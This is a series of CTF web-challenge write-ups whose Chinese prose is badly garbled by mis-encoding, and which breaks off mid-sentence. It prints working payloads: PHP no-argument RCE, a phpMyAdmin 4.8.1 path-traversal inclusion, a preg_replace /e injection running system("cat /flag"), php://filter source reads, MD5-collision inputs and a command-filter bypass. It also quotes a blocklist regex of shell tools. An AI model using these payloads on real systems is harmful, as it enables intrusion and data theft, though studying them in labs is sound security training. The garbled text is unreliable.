é€šå¸¸ä¸€äº›webåº”ç”¨æˆ‘ä»¬ä¼šä½¿ç”¨å¤šä¸ªwebæœåŠ¡å™¨æ­é…ä½¿ç”¨ï¼Œè§£å†³å…¶ä¸­çš„ä¸€ä¸ªwebæœåŠ¡å™¨çš„æ€§èƒ½ç¼ºé™·ä»¥åŠåšå‡è¡¡è´Ÿè½½çš„ä¼˜ç‚¹å’Œå®Œæˆä¸€äº›åˆ†å±‚ç»“æ„çš„å®‰å…¨ç­–ç•¥ç­‰ã€‚åœ¨ä½¿ç”¨è¿™ç§æ¶æ„çš„æ—¶å€™ï¼Œç”±äºå¯¹é™æ€èµ„æºçš„ç›®å½•æˆ–æ–‡ä»¶çš„æ˜ å°„é…ç½®ä¸å½“ï¼Œå¯èƒ½ä¼šå¼•å‘ä¸€äº›çš„å®‰å…¨é—®é¢˜ï¼Œå¯¼è‡´web.xmlç­‰æ–‡ä»¶èƒ½å¤Ÿè¢«è¯»å–ã€‚æ¼æ´æ£€æµ‹ä»¥åŠåˆ©ç”¨æ–¹æ³•ï¼šé€šè¿‡æ‰¾åˆ°web.xmlæ–‡ä»¶ï¼Œæ¨æ–­classæ–‡ä»¶çš„è·¯å¾„ï¼Œæœ€åç›´æ¥classæ–‡ä»¶ï¼Œåœ¨é€šè¿‡åç¼–è¯‘classæ–‡ä»¶ï¼Œå¾—åˆ°ç½‘ç«™æºç ã€‚ä¸€èˆ¬æƒ…å†µï¼Œjspå¼•æ“é»˜è®¤éƒ½æ˜¯ç¦æ­¢è®¿é—®WEB-INFç›®å½•çš„ï¼ŒNginx é…åˆTomcatåšå‡è¡¡è´Ÿè½½æˆ–é›†ç¾¤ç­‰æƒ…å†µæ—¶ï¼Œé—®é¢˜åŸå› å…¶å®å¾ˆç®€å•ï¼ŒNginxä¸ä¼šå»è€ƒè™‘é…ç½®å…¶ä»–ç±»å‹å¼•æ“ï¼ˆNginxä¸æ˜¯jspå¼•æ“ï¼‰å¯¼è‡´çš„å®‰å…¨é—®é¢˜è€Œå¼•å…¥åˆ°è‡ªèº«çš„å®‰å…¨è§„èŒƒä¸­æ¥ï¼ˆè¿™æ ·è€¦åˆæ€§å¤ªé«˜äº†ï¼‰ï¼Œä¿®æ”¹Nginxé…ç½®æ–‡ä»¶ç¦æ­¢è®¿é—®WEB-INFç›®å½•å°±å¥½äº†ï¼š location ~ ^&#x2F;WEB-INF&#x2F;* &#123; deny all; &#125; æˆ–è€…return 404; æˆ–è€…å…¶ä»–ï¼ æ¼æ´åˆ©ç”¨ æ¼æ´æ£€æµ‹ä»¥åŠåˆ©ç”¨æ–¹æ³•ï¼šé€šè¿‡æ‰¾åˆ°web.xmlæ–‡ä»¶ï¼Œæ¨æ–­classæ–‡ä»¶çš„è·¯å¾„ï¼Œæœ€åç›´æ¥classæ–‡ä»¶ï¼Œåœ¨é€šè¿‡åç¼–è¯‘classæ–‡ä»¶ï¼Œå¾—åˆ°ç½‘ç«™æºç  æ‰€ä»¥å…ˆè®¿é—®ä¸€ä¸‹WEB-INF/web.xml è¿™ä¸ªè·¯å¾„com.wm.ctf.IndexControlleråº”è¯¥å’Œflagæœ‰å…³ æ‰€ä»¥è¯•è¯•è®¿é—®ä¸€ä¸‹ çœ‹åˆ°æœ‰å—ç±»ä¼¼base64 è§£ç å¾—åˆ°flag [GXYCTF2019]ç¦æ­¢å¥—å¨ƒ[(1æ¡æ¶ˆæ¯) BUU-WEB-GXYCTF2019]ç¦æ­¢å¥—å¨ƒ_TzZzEZ-webçš„åšå®¢-CSDNåšå®¢ [GXYCTF2019]ç¦æ­¢å¥—å¨ƒ - ç‹å¹ä¹‹ - åšå®¢å›­ (cnblogs.com) é¢˜ç›®å­˜åœ¨gitæ³„éœ²ï¼Œç”¨GitHackæ‰«ä¸€ä¸‹å¾—åˆ°æºç  å¯ä»¥çŒœåˆ°è¿™é‡Œåˆ©ç”¨äº†evalè¿›è¡Œå‘½ä»¤æ‰§è¡Œï¼Œä½†æ˜¯è¿‡æ»¤äº†å¾ˆå¤šä¸œè¥¿ 1.éœ€è¦ä»¥GETå½¢å¼ä¼ å…¥ä¸€ä¸ªåä¸ºexpçš„å‚æ•°ã€‚å¦‚æœæ»¡è¶³æ¡ä»¶ä¼šæ‰§è¡Œè¿™ä¸ªexpå‚æ•°çš„å†…å®¹ã€‚ 2.è¿‡æ»¤äº†å¸¸ç”¨çš„å‡ ä¸ªä¼ªåè®®ï¼Œä¸èƒ½ä»¥ä¼ªåè®®è¯»å–æ–‡ä»¶ã€‚ 3.(?R)å¼•ç”¨å½“å‰è¡¨è¾¾å¼ï¼Œåé¢åŠ äº†?é€’å½’è°ƒç”¨ã€‚åªèƒ½åŒ¹é…é€šè¿‡æ— å‚æ•°çš„å‡½æ•°ã€‚ 4.æ­£åˆ™åŒ¹é…æ‰äº†et&#x2F;na&#x2F;infoç­‰å…³é”®å­—ï¼Œå¾ˆå¤šå‡½æ•°éƒ½ç”¨ä¸äº†ã€‚ 5ï¼ševal($_GET[&#39;exp&#39;]); å…¸å‹çš„æ— å‚æ•°RCE PHP Parametric Function RCE Â· sky&#39;s blog (skysec.top)å…³äºæ— å‚æ•°rce é¦–å…ˆè¦è¯»å–ç›®å½•å†…å®¹ï¼Œ å¯ä»¥ç”¨print_r(scandir(&#39;.&#39;)); ä½†æ˜¯å› ä¸ºä¸èƒ½ä¼ å‚ï¼Œæ‰€ä»¥è¦æƒ³æŠŠ.ç”¨å‡½æ•°ä»£æ›¿ è¿™é‡Œæœ‰ä¸¤ä¸ªå‡½æ•°å¯ä»¥åˆ©ç”¨ localeconv() å‡½æ•°è¿”å›ä¸€åŒ…å«æœ¬åœ°æ•°å­—åŠè´§å¸æ ¼å¼ä¿¡æ¯çš„æ•°ç»„ã€‚è€Œæ•°ç»„ç¬¬ä¸€é¡¹å°±æ˜¯. current() è¿”å›æ•°ç»„ä¸­çš„å½“å‰å•å…ƒ, é»˜è®¤å–ç¬¬ä¸€ä¸ªå€¼ æ‰€ä»¥current(localeconv())æ°¸è¿œæ˜¯ä¸ª. ä¹Ÿå°±å¯ä»¥ç”¨print_r(scandir(current(localeconv())));æ¥è¯»ç›®å½• å¯ä»¥çœ‹åˆ°flagå°±åœ¨flag.phpä¸­ ç°åœ¨è¦æƒ³åŠæ³•æŠŠå®ƒè¯»å‡ºæ¥ è¿™é‡Œå¯ä»¥åˆ©ç”¨array_reverse()å’Œnextå‡½æ•° é€šè¿‡array_reverse() å‡½æ•°è¿”å›ç¿»è½¬é¡ºåºçš„æ•°ç»„ã€‚ï¼ˆåè½¬ä¹‹åflag.phpè¢«æ”¾åœ¨ç¬¬äºŒä¸ªæ•°ç»„ä¹‹ä¸­ï¼‰next() å‡½æ•°å°†å†…éƒ¨æŒ‡é’ˆæŒ‡å‘æ•°ç»„ä¸­çš„ä¸‹ä¸€ä¸ªå…ƒç´ ï¼Œå¹¶è¾“å‡ºã€‚payloadä¸ºï¼š ï¼Ÿexp&#x3D;show_source(next(array_reverse(scandir(pos(localeconv()))))); ä¹Ÿå¯ä»¥åˆ©ç”¨ array_flip()äº¤æ¢æ•°ç»„çš„é”®å’Œå€¼ array_rand()ä»æ•°ç»„ä¸­éšæœºå–å‡ºä¸€ä¸ªæˆ–å¤šä¸ªå•å…ƒ æœ€åå†åˆ©ç”¨readfileå‡½æ•°è¯»å‡ºæ–‡ä»¶æˆ–è€…ç”¨show_sourceè®©å®ƒé«˜äº®æ˜¾ç¤º ç”±äºarray_randæ˜¯éšæœºçš„ï¼Œæ‰€ä»¥è¦å¤šåˆ·æ–°å‡ æ¬¡æ‰å¯èƒ½ä¼šæ˜¾ç¤ºflag.phpçš„å†…å®¹ [GWCTF 2019]æˆ‘æœ‰ä¸€ä¸ªæ•°æ®åº“å¾¡å‰‘æ˜¯çœŸçš„ä¸å¥½ç”¨ã€‚ã€‚ã€‚phpmyadminè·¯å¾„æ­»æ´»æ‰«ä¸å‡ºæ¥ è¿™é‡Œphpmyadminç‰ˆæœ¬æ˜¯4.8.1 ç”±äºphpmyadmin4.8.0-4.8.1å­˜åœ¨æ–‡ä»¶åŒ…å«æ¼æ´ ç›´æ¥ç”¨payloadæ‰“ ?target=db_datadict.php%253f/../../../../../../../../flag [BJDCTF2020]The mystery of ipè¿™é“é¢˜ç¬¬ä¸€çœ¼çœ‹ä¸Šå»åƒæ˜¯æœ¬åœ°è®¿é—®çš„é¢˜ç›® ä½†æ˜¯hintæœ‰æ„Ÿè§‰ä¸å¤ªåƒ æŠ“åŒ…ä¿®æ”¹xffå¤´åå°±æ²¡æ€è·¯äº†ï¼ŒæŸ¥äº†ä¸€ä¸‹å‘ç°æ˜¯smartyæ¨¡æ¿æ³¨å…¥ çœ‹åˆ°è¿™é‡Œæ”¯æŒé€»è¾‘è¿ç®—ï¼Œå¯ä»¥ç›´æ¥è§£æï¼Œæ‰€ä»¥å°±å¯ä»¥åˆ©ç”¨ç³»ç»Ÿå‘½ä»¤æ¥è¯»flag Smarty SSTIåˆ©ç”¨ (1æ¡æ¶ˆæ¯) PHPçš„æ¨¡æ¿æ³¨å…¥ï¼ˆSmartyæ¨¡æ¿ï¼‰_WHOAMIAnonyçš„åšå®¢-CSDNåšå®¢_smartyæ¨¡æ¿æ³¨å…¥ Smartyæ˜¯åŸºäºPHPå¼€å‘çš„ï¼Œå¯¹äºSmartyçš„SSTIçš„åˆ©ç”¨æ‰‹æ®µä¸å¸¸è§çš„flaskçš„SSTIæœ‰å¾ˆå¤§åŒºåˆ«ã€‚ æ¼æ´ç¡®è®¤ ä¸€èˆ¬æƒ…å†µä¸‹è¾“å…¥{$smarty.version}å°±å¯ä»¥çœ‹åˆ°è¿”å›çš„smartyçš„ç‰ˆæœ¬å·ã€‚ å¸¸è§„åˆ©ç”¨æ–¹å¼ Smartyæ”¯æŒä½¿ç”¨&#123;php&#125;&#123;/php&#125;æ ‡ç­¾æ¥æ‰§è¡Œè¢«åŒ…è£¹å…¶ä¸­çš„phpæŒ‡ä»¤ï¼Œæœ€å¸¸è§„çš„æ€è·¯è‡ªç„¶æ˜¯å…ˆæµ‹è¯•è¯¥æ ‡ç­¾ã€‚ {literal} æ ‡ç­¾ &#123;literal&#125;å¯ä»¥è®©ä¸€ä¸ªæ¨¡æ¿åŒºåŸŸçš„å­—ç¬¦åŸæ ·è¾“å‡ºã€‚ è¿™ç»å¸¸ç”¨äºä¿æŠ¤é¡µé¢ä¸Šçš„Javascriptæˆ–cssæ ·å¼è¡¨ï¼Œé¿å…å› ä¸ºSmartyçš„å®šç•Œç¬¦è€Œé”™è¢«è§£æã€‚ è‹¥è¯¥é¢˜ç¯å¢ƒä¸ºphp5ï¼Œåˆ™å¯ä»¥ &lt;script&gt;language&#x3D;&quot;php&quot;&gt;phpinfo();&lt;&#x2F;script&gt; é™æ€æ–¹æ³• é€šè¿‡selfè·å–Smartyç±»å†è°ƒç”¨å…¶é™æ€æ–¹æ³•å®ç°æ–‡ä»¶è¯»å†™è¢«ç½‘ä¸Šå¾ˆå¤šæ–‡ç« é‡‡ç”¨ã€‚ åœ¨3.1.30çš„Smartyç‰ˆæœ¬ä¸­å®˜æ–¹å·²ç»æŠŠè¯¥é™æ€æ–¹æ³•åˆ é™¤ {if}æ ‡ç­¾å®˜æ–¹æ–‡æ¡£ä¸­çœ‹åˆ°è¿™æ ·çš„æè¿°ï¼š Smartyçš„{if}æ¡ä»¶åˆ¤æ–­å’ŒPHPçš„iféå¸¸ç›¸ä¼¼ï¼Œåªæ˜¯å¢åŠ äº†ä¸€äº›ç‰¹æ€§ã€‚æ¯ä¸ª{if}å¿…é¡»æœ‰ä¸€ä¸ªé…å¯¹çš„{/if}ï¼Œä¹Ÿå¯ä»¥ä½¿ç”¨{else} å’Œ {elseif}ï¼Œå…¨éƒ¨çš„PHPæ¡ä»¶è¡¨è¾¾å¼å’Œå‡½æ•°éƒ½å¯ä»¥åœ¨ifå†…ä½¿ç”¨ï¼Œå¦‚||, or, &amp;&amp;, and, is_array(), ç­‰ç­‰ï¼Œå¦‚ï¼š{if is_array($array)}{/if} [BJDCTF2020]ZJCTFï¼Œä¸è¿‡å¦‚æ­¤ç¬¬ä¸€éƒ¨åˆ† å¯ä»¥ç”¨ä¼ªåè®®è¯»å–ï¼Œä½†æ˜¯ä¸çŸ¥é“ä¸ºä»€ä¹ˆæˆ‘ç”¨hackbaræ—¶æ²¡æˆåŠŸ ä¹Ÿå¯ä»¥ç”¨è¿™ä¸ªpayload text&#x3D;data:&#x2F;&#x2F;text&#x2F;plain;base64,SSBoYXZlIGEgZHJlYW0&#x3D;&amp;file&#x3D;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;next.php base64è§£ç  å½“patternä¼ å…¥çš„æ­£åˆ™è¡¨è¾¾å¼å¸¦æœ‰/eæ—¶ï¼Œå­˜åœ¨å‘½ä»¤æ‰§è¡Œï¼Œå³å½“åŒ¹é…åˆ°ç¬¦åˆæ­£åˆ™è¡¨è¾¾å¼çš„å­—ç¬¦ä¸²æ—¶ï¼Œç¬¬äºŒä¸ªå‚æ•°çš„å­—ç¬¦ä¸²å¯è¢«å½“åšä»£ç æ¥æ‰§è¡Œã€‚æ€è·¯æ˜¯åˆ©ç”¨è¿™ä¸ªä»£ç æ‰§è¡Œï¼Œæ‰§è¡Œæºç ä¸­çš„getFlag()å‡½æ•°ï¼Œåœ¨ä¼ å…¥cmdå‚æ•°ï¼Œå†åˆ©ç”¨getFlagä¸­çš„evalï¼ˆï¼‰å‡½æ•°ï¼Œå†è¿›è¡Œä¸€ä¸ªä»£ç æ‰§è¡Œã€‚ æ·±å…¥ç ”ç©¶preg_replaceä¸ä»£ç æ‰§è¡Œ - å…ˆçŸ¥ç¤¾åŒº (aliyun.com) è¿™é‡Œç¬¬äºŒä¸ªå‚æ•°å›ºå®šä¸ºstrtolower(&quot;\\\\1&quot;)è¿™é‡Œçš„\\\\1å®é™…ä¸Šä½“ç°ä¸º\\1 \\1 åœ¨æ­£åˆ™è¡¨è¾¾å¼ä¸­æœ‰è‡ªå·±çš„å«ä¹‰: åå‘å¼•ç”¨å¯¹ä¸€ä¸ªæ­£åˆ™è¡¨è¾¾å¼æ¨¡å¼æˆ–éƒ¨åˆ†æ¨¡å¼ä¸¤è¾¹æ·»åŠ åœ†æ‹¬å·å°†å¯¼è‡´ç›¸å…³åŒ¹é…å­˜å‚¨åˆ°ä¸€ä¸ªä¸´æ—¶ç¼“å†²åŒºä¸­ï¼Œæ‰€æ•è·çš„æ¯ä¸ªå­åŒ¹é…éƒ½æŒ‰ç…§åœ¨æ­£åˆ™è¡¨è¾¾å¼æ¨¡å¼ä¸­ä»å·¦åˆ°å³å‡ºç°çš„é¡ºåºå­˜å‚¨ã€‚ç¼“å†²åŒºç¼–å·ä» 1 å¼€å§‹ï¼Œæœ€å¤šå¯å­˜å‚¨ 99 ä¸ªæ•è·çš„å­è¡¨è¾¾å¼ã€‚æ¯ä¸ªç¼“å†²åŒºéƒ½å¯ä»¥ä½¿ç”¨ â€˜\\nâ€™ è®¿é—® è¿™é‡Œçš„\\1æŒ‡çš„æ˜¯ç¬¬ä¸€ä¸ªåŒ¹é…é¡¹ è¿™é‡Œæˆ‘ä»¬å°±è¦åˆ©ç”¨è¿™ä¸ªæ¼æ´æ¥è¿è¡Œgetflagå‡½æ•°ï¼Œå¹¶åŒæ—¶ç»™cmdä¼ å‚ï¼Œåˆ©ç”¨systemæ¥æ‰§è¡Œå‘½ä»¤ ä¸ºäº†å®ç°è¿è¡Œgetflagçš„ç›®çš„ï¼Œå°±è¦å…ˆè®©\\1ä¸ºgetflag(),ä¹Ÿå°±æ˜¯ä¼ å…¥ .*={${getFlag()}} åŸå…ˆçš„è¯­å¥ï¼š preg_replace(&#39;&#x2F;(&#39; . $regex . &#39;)&#x2F;ei&#39;, &#39;strtolower(&quot;\\\\1&quot;)&#39;, $value); å˜æˆäº†è¯­å¥ï¼š preg_replace(&#39;&#x2F;(.*)&#x2F;ei&#39;, &#39;strtolower(&quot;\\\\1&quot;)&#39;,&#123;$&#123;getFlag()&#125;&#125;); è¿™æ ·é€šè¿‡preg_replaceåå°±ä¼šè¿è¡Œgetflagå‡½æ•°ï¼Œä½†æ˜¯ç”±äºphpç‰¹æ€§.ä¼ å…¥åä¼šå˜ä¸º_æ‰€ä»¥è¿™é‡Œè¦åˆ©ç”¨æ­£åˆ™åŒ¹é…ä¸­çš„\\S æ‰€ä»¥ä¼ å…¥çš„payloadä¸º\\S*={${getFlag()}} \\S åœ¨phpæ­£åˆ™è¡¨è¾¾å¼ä¸­è¡¨ç¤ºåŒ¹é…æ‰€æœ‰éç©ºå­—ç¬¦ï¼Œ*è¡¨ç¤ºå¤šæ¬¡åŒ¹é… æœ€ç»ˆpayloadä¸º?\\S*={${getFlag()}}&amp;cmd=system(&quot;cat /flag&quot;); [BJDCTF2020]Mark loves catæ•´åäº†çŸ¥é“æ˜¯gitæ³„éœ²ä½†æ˜¯ç”¨githackæ‰«å®Œä¹‹åå°±æ˜¯æ²¡æœ‰æºç ã€‚ã€‚ã€‚ æ¥ä¸€ä¸‹ç™¾åº¦çš„wpçš„æºç  index.php &lt;?php include &#39;flag.php&#39;; $yds &#x3D; &quot;dog&quot;; $is &#x3D; &quot;cat&quot;; $handsome &#x3D; &#39;yds&#39;; foreach($_POST as $x &#x3D;&gt; $y)&#123; $$x &#x3D; $y; &#125; foreach($_GET as $x &#x3D;&gt; $y)&#123; $$x &#x3D; $$y; &#125; foreach($_GET as $x &#x3D;&gt; $y)&#123; if($_GET[&#39;flag&#39;] &#x3D;&#x3D;&#x3D; $x &amp;&amp; $x !&#x3D;&#x3D; &#39;flag&#39;)&#123; exit($handsome); &#125; &#125; if(!isset($_GET[&#39;flag&#39;]) &amp;&amp; !isset($_POST[&#39;flag&#39;]))&#123; exit($yds); &#125; if($_POST[&#39;flag&#39;] &#x3D;&#x3D;&#x3D; &#39;flag&#39; || $_GET[&#39;flag&#39;] &#x3D;&#x3D;&#x3D; &#39;flag&#39;)&#123; exit($is); &#125; echo &quot;the flag is: &quot;.$flag; flag.php &lt;?php $flag &#x3D; file_get_contents(&#39;&#x2F;flag&#39;); å‰ä¸¤ä¸ªforeachè¯­å¥åˆ†åˆ«å°†POSTå‚æ•°å’ŒGETå‚æ•°è¿›è¡Œå˜é‡è¦†ç›–ï¼Œæ¥ç€æ˜¯ä¸‰ä¸ªifè¯­å¥ï¼Œexit()å‡½æ•°é€€å‡ºè„šæœ¬çš„åŒæ—¶è¾“å‡ºå˜é‡ï¼Œæœ€åä¸€å¥æ˜¯è¾“å‡ºæˆ‘ä»¬æƒ³è¦çš„flagã€‚ é¦–å…ˆæˆ‘ä»¬æƒ³åˆ°çš„æ˜¯è®©è„šæœ¬æ‰§è¡Œåˆ°æœ€åä¸€å¥echo $flag;ï¼Œä½†å³ä½¿ç»•è¿‡ä¸‰ä¸ªifè¯­å¥ï¼Œæˆ‘ä»¬GETä¼ å‚æˆ–è€…POSTä¼ å‚çš„flagæ€»ä¼šè¢«å˜é‡è¦†ç›–ï¼šå¦‚æˆ‘ä»¬GETä¼ å‚flag=aaaï¼Œåœ¨ç¬¬äºŒä¸ªforeachè¯­å¥ä¸­å˜æˆ$flag = $aaaï¼Œè€Œ$aaaå˜é‡æ²¡æœ‰å®šä¹‰ä¸ºç©ºï¼Œæœ€åçš„è¾“å‡ºå°±æ˜¯ç©º ä½†æ˜¯ç”±äºå˜é‡è¦†ç›–çš„åŸå› æœ€ç»ˆä¸ä¼šæ˜¾ç¤ºflag è€Œexit()å‡½æ•°è™½ç„¶ä¼šé€€å‡ºæ‰§è¡Œï¼Œä½†ä¹Ÿä¼šè¾“å‡ºå…¶å‚æ•°ï¼Œæˆ‘ä»¬å¯ä»¥åˆ©ç”¨å˜é‡è¦†ç›–å°†exit()å‡½æ•°å†…çš„å‚æ•°ç”¨$flagè¦†ç›–æ‰å°±èƒ½è¾“å‡ºflagäº†ï¼› æ‰€ä»¥æˆ‘ä»¬å¯ä»¥å€ŸåŠ©åä¸¤ä¸ªifè¯­å¥ä¸­çš„exitæ¥è¾“å‡ºflag å½“æˆ‘ä»¬get yds=flagæ—¶ï¼Œæ»¡è¶³ç¬¬äºŒä¸ªifåˆ¤æ–­ï¼Œè€Œç”±äºç¬¬ä¸€ä¸ªforeachè¯­å¥ï¼Œ$yds=$flagï¼Œæ‰€ä»¥æœ€ç»ˆå°±ä¼šå˜æˆexit($flag); è¿˜å¯ä»¥å€ŸåŠ©ç¬¬ä¸‰ä¸ªifè¯­å¥ï¼Œå½“æˆ‘ä»¬get flag=flag&amp;is=flagåç»è¿‡ç¬¬äºŒä¸ªforeachè¯­å¥$flag=$flagï¼Œ$is=$flagå¯¹flagè‡ªèº«æ— å½±å“ï¼Œåˆå› ä¸ºæ»¡è¶³ç¬¬ä¸‰ä¸ªifè¯­å¥ï¼Œä¹Ÿä¼šè¾“å‡ºflagå€¼ BJDCTF2020]Mark loves cat (ä¸¤ç§è§£æ³•)ï¼ˆå˜é‡è¦†ç›–æ¼æ´ï¼‰_Zero_Adamçš„åšå®¢-CSDNåšå®¢ BJDCTF2020]Mark loves cat_qtL0ngçš„åšå®¢-CSDNåšå®¢ [å®‰æ´µæ¯ 2019]easy_webè¿›å…¥åçœ‹åˆ°imgå‚æ•°åƒbase64ï¼Œè§£ç ä¸¤æ¬¡å†ç”¨16è¿›åˆ¶è½¬å­—ç¬¦ä¸²ä¼šå˜æˆ555.png æ‰€ä»¥ä¸ºäº†æƒ³è¯»å–æºç ï¼Œæˆ‘ä»¬å°†index.phpæŒ‰ç…§ç›¸åŒçš„æ–¹å¼åŠ å¯†åå˜ä¸º TmprMlpUWTBOalUzT0RKbE56QTJPRGN3 ä¿®æ”¹åæ›¿æ¢imgåŸæ¥çš„å€¼ï¼Œå‘ç°ä¾æ—§è¿”å›äº†ä¸€å¤§ä¸²base64ç¼–ç ï¼Œè§£ç åå¯è·å¾—æºç  é‡ç‚¹ï¼š if (preg_match(&quot;&#x2F;ls|bash|tac|nl|more|less|head|wget|tail|vi|cat|od|grep|sed|bzmore|bzless|pcre|paste|diff|file|echo|sh|\\&#39;|\\&quot;|\\&#96;|;|,|\\*|\\?|\\\\|\\\\\\\\|\\n|\\t|\\r|\\xA0|\\&#123;|\\&#125;|\\(|\\)|\\&amp;[^\\d]|@|\\||\\\\$|\\[|\\]|&#123;|&#125;|\\(|\\)|-|&lt;|&gt;&#x2F;i&quot;, $cmd)) &#123; echo(&quot;forbid ~&quot;); echo &quot;&lt;br&gt;&quot;; &#125; else &#123; if ((string)$_POST[&#39;a&#39;] !&#x3D;&#x3D; (string)$_POST[&#39;b&#39;] &amp;&amp; md5($_POST[&#39;a&#39;]) &#x3D;&#x3D;&#x3D; md5($_POST[&#39;b&#39;])) &#123; echo &#96;$cmd&#96;; &#125; else &#123; echo (&quot;md5 is funny ~&quot;); &#125; &#125; å…ˆçœ‹ç¬¬äºŒä¸ªifé‡Œçš„md5çš„æ¯”è¾ƒï¼Œä¼ æ•°ç»„æˆ–è€…ä¼ md5å€¼ä¸º0eå¼€å¤´çš„éƒ½æ²¡æ³•ç»•è¿‡å» (1æ¡æ¶ˆæ¯) æµ…è°ˆPHPä¸­å“ˆå¸Œæ¯”è¾ƒç¼ºé™·é—®é¢˜åŠå“ˆå¸Œå¼ºæ¯”è¾ƒç›¸å…³é—®é¢˜_æœ«åˆ Â· mochu7-CSDNåšå®¢ MD5ç¢°æ’çš„ä¸€äº›ä¾‹å­ - ç®€ä¹¦ (jianshu.com) ä»è¿™ä¸¤ç¯‡æ–‡ç« é‡Œèƒ½æ‰¾åˆ°å­˜åœ¨æ–‡ä»¶åå…­è¿›åˆ¶å­—èŠ‚æµæ•°æ®çš„å“ˆå¸Œå€¼ç›¸ç­‰ å†è€ƒè™‘åˆ°è¦å°†ä¸€äº›ä¸å¯è§å­—ç¬¦ä¼ åˆ°æœåŠ¡å™¨ï¼Œè¿™é‡Œå¯ä»¥ä½¿ç”¨urlç¼–ç  æœ€ç»ˆ a&#x3D;%4d%c9%68%ff%0e%e3%5c%20%95%72%d4%77%7b%72%15%87%d3%6f%a7%b2%1b%dc%56%b7%4a%3d%c0%78%3e%7b%95%18%af%bf%a2%00%a8%28%4b%f3%6e%8e%4b%55%b3%5f%42%75%93%d8%49%67%6d%a0%d1%55%5d%83%60%fb%5f%07%fe%a2&amp;b&#x3D;%4d%c9%68%ff%0e%e3%5c%20%95%72%d4%77%7b%72%15%87%d3%6f%a7%b2%1b%dc%56%b7%4a%3d%c0%78%3e%7b%95%18%af%bf%a2%02%a8%28%4b%f3%6e%8e%4b%55%b3%5f%42%75%93%d8%49%67%6d%a0%d1%d5%5d%83%60%fb%5f%07%fe%a2 è¿™é‡Œè¦ç»•è¿‡ä¸¤ä¸ªifè¯­å¥ï¼Œç„¶åæ‰§è¡Œcmdä¸­çš„å‚æ•°ï¼Œæ‰€ä»¥å¯ä»¥åˆ©ç”¨åæ–œæ ç»•è¿‡ï¼Œåœ¨æ­£åˆ™è¡¨è¾¾å¼ä¸­ä¸‰ä¸ªåæ–œæ æ‰èƒ½åŒ¹é…åˆ°åæ–œæ ï¼Œ (1æ¡æ¶ˆæ¯) ã€PHPã€‘ä¹‹4ä¸ªåæ–œæ ã€3ä¸ªåæ–œæ çš„æƒ…å†µ_Hertterçš„åšå®¢-CSDNåšå®¢ ä¸ºä»€ä¹ˆ3åæ–œæ åœ¨phpä¸­ç­‰äº4åæ–œæ ï¼Ÿ - Thinbug é¢˜ç›®é‡Œçš„æ­£åˆ™å…¶å®æœ‰äº›é—®é¢˜ï¼Œæ‰€ä»¥è™½ç„¶å­˜åœ¨äº†å››ä¸ªåæ–œæ ä½†æ˜¯ä¾æ—§æ²¡æœ‰è¿‡æ»¤æ‰åæ–œæ  è´´ä¸ªå¤§ä½¬çš„æ–‡ç«  ä»ä¸€é“CTFçš„éé¢„æœŸè§£çœ‹PHPåæ–œæ åŒ¹é…é—®é¢˜ - ç®€ä¹¦ (jianshu.com) å¯ä»¥å…ˆç”¨diræŸ¥çœ‹ç›®å½• ca\\t%20/flagæ¥ç»•è¿‡ç¬¬ä¸€ä¸ªif ç”¨\\çš„åŸå› æ˜¯å› ä¸ºåœ¨linuxä¸‹è¡Œå°¾è¾“\\å¯ä»¥æ¢è¡Œå¹¶ä¸”ç»§ç»­è¾“å…¥å‘½ä»¤ è¿™é‡Œæ­£åˆ™åŒ¹é…æ¼äº†uniqå’Œsortï¼Œç”¨è¿™ä¿©ä¹Ÿèƒ½æ‹¿åˆ°flag [ç½‘é¼æ¯ 2020 æœ±é›€ç»„]phpwebå…ˆæŠ“åŒ… å‘ç°æœ‰ä¸¤ä¸ªpostçš„å‚æ•° ç„¶åæ ¹æ®æŠ¥é”™çš„ä¿¡æ¯ è¿™é‡Œç”¨äº†call_user_funcå‡½æ•°ï¼Œä¹Ÿå°±æ˜¯funcæ˜¯å‡½æ•°åï¼Œpæ˜¯å‚æ•° ç”¨systemè¯•æ—¶å‘ç°è¢«è¿‡æ»¤äº†ï¼Œå‘ç°file_get_contentså‡½æ•°å¯ä»¥ç”¨ file_get_contentsæ‹¿æºç  &lt;?php $disable_fun = array(&quot;exec&quot;,&quot;shell_exec&quot;,&quot;system&quot;,&quot;passthru&quot;,&quot;proc_open&quot;,&quot;show_source&quot;,&quot;phpinfo&quot;,&quot;popen&quot;,&quot;dl&quot;,&quot;eval&quot;,&quot;proc_terminate&quot;,&quot;touch&quot;,&quot;escapeshellcmd&quot;,&quot;escapeshellarg&quot;,&quot;assert&quot;,&quot;substr_replace&quot;,&quot;call_user_func_array&quot;,&quot;call_user_func&quot;,&quot;array_filter&quot;, &quot;array_walk&quot;, &quot;array_map&quot;,&quot;registregister_shutdown_function&quot;,&quot;register_tick_function&quot;,&quot;filter_var&quot;, &quot;filter_var_array&quot;, &quot;uasort&quot;, &quot;uksort&quot;, &quot;array_reduce&quot;,&quot;array_walk&quot;, &quot;array_walk_recursive&quot;,&quot;pcntl_exec&quot;,&quot;fopen&quot;,&quot;fwrite&quot;,&quot;file_put_contents&quot;); function gettime($func, $p) &#123; $result = call_user_func($func, $p); $a= gettype($result); if ($a == &quot;string&quot;) &#123; return $result; &#125; else &#123;return &quot;&quot;;&#125; &#125; class Test &#123; var $p = &quot;Y-m-d h:i:s a&quot;; var $func = &quot;date&quot;; function __destruct() &#123; if ($this-&gt;func != &quot;&quot;) &#123; echo gettime($this-&gt;func, $this-&gt;p); &#125; &#125; &#125; $func = $_REQUEST[&quot;func&quot;]; $p = $_REQUEST[&quot;p&quot;]; if ($func != null) &#123; $func = strtolower($func); if (!in_array($func,$disable_fun)) &#123; echo gettime($func, $p); &#125;else &#123; die(&quot;Hacker...&quot;); &#125; &#125; ?&gt; ç”±äºè¿™ä¸ªè¿‡æ»¤ä¸å­˜åœ¨ä¸testä¸­ï¼Œæ‰€ä»¥å¯ä»¥åˆ©ç”¨ååºåˆ—åŒ–æ¥æ‰§è¡Œå‘½ä»¤ åˆ©ç”¨findå‘½ä»¤æ¥æŸ¥æ‰¾æ–‡ä»¶åä¸­æœ‰flagçš„æ–‡ä»¶ æœ€åç”¨file_get_contentsæ¥æŸ¥çœ‹æ–‡ä»¶ [NCTF2019]Fake XML cookbookçœ‹åˆ°è¿™é¢˜ç›®ç¬¬ä¸€çœ¼å°±æ„Ÿè§‰æ˜¯xxeæ¼æ´ï¼Œæ­£å¥½è¶è¿™ä¸ªæœºä¼šæŠŠxmlå­¦ä¸€ä¸‹ ä»XMLç›¸å…³ä¸€æ­¥ä¸€æ­¥åˆ°XXEæ¼æ´ - 